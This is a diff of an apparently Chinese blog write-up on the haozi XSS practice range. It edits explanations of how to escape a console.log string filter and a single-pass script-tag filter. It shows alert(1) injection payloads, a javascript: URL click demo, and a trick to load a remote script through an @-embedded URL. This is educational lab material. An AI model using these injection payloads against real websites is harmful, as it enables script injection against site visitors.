@@ -53,7 +53,7 @@
 
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">https:<span class="comment">//www.segmentfault.com@xss.haozi.me/j.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里引入一个靶场自身站点下的js文件（多次尝试无果，最后使用的火狐浏览器）</span></span><br></pre></td></tr></table></figure>
 
-<p>注：</p>
+<p>注解：</p>
 <p>chrome浏览器因为弃用了一些@嵌入式的一些请求，所以使用了火狐浏览器做这道题。</p>
 <p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200513100657413.png" alt="image-20200513100657413"></p>
 <p>自己搭建VPS需支持HTTPS请求否则无法加载js</p>
@@ -92,15 +92,20 @@
 
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line"><span class="string">");alert(1)//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// "</span>\/\/<span class="string">"转义在js中还是注释</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line"><span class="string">");alert(1)("</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行闭合前后的内容</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line"><span class="string">");alert(1)("</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转义后还是",进行闭合前后的内容</span></span><br></pre></td></tr></table></figure>
 
+<p>注解：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line"><span class="string">");alert(1)("</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// html</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">'javascript:console.log("\");alert(1)(\"")'</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>) <span class="comment">// 创建一个新的元素</span></span><br><span class="line">  a.href = url <span class="comment">//&lt;a&gt; 标签的 href 属性用于指定超链接目标的 URL</span></span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a) <span class="comment">// 在节点的子节点列表末添加新的子节点</span></span><br><span class="line">  a.click() <span class="comment">//触发点击事件</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 
-
+<p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200515101607256.png" alt="image-20200515101607256"></p>
+<p>&quot;进行转义后还是”</p>
+<p>在 JavaScript 中使用反斜杠来向文本字符串添加特殊字符时都可以使用反斜杠来添加到文本字符串中</p>
+<p>可参考：<a href="https://www.w3school.com.cn/js/js_special_characters.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/js/js_special_characters.asp</a></p>
 <h5 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;<span class="regexp">/script&gt; &lt;script&gt;alert(1)&lt;/</span>script&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">// 只过滤一次，内嵌一个script</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">\<span class="string">");</span></span><br><span class="line"><span class="string">alert(1);</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// "</span>被转义成\<span class="string">"经过html 解析后，变成 console.log("</span>\<span class="string">") 会报语法错误, 再补个 \ 即可</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">\<span class="string">");</span></span><br><span class="line"><span class="string">alert(1);</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// "</span>被转义成\<span class="string">"经过解析后，变成 console.log("</span>\<span class="string">") 会报语法错误, 再补个 \ 即可</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200513182714494.png" alt="image-20200513182714494"></p>
 <h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>payload并不唯一，有多种解法，这里不一一叙述，如有错误还请斧正。</p>
